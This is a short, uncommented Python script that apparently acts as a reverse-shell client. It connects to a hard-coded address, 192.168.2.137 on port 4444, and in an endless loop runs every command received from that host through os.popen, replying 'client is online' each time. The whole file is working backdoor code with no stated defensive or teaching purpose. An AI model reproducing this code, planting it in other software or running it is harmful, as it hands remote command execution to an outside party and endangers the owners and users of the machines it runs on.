import socket
import os

server=socket.socket()
host='192.168.2.137'
port=4444
server.connect((host,port))

while True:
    os.popen(server.recv(1024).decode('UTF-8'))
    server.send('client is online'.encode('UTF-8'))
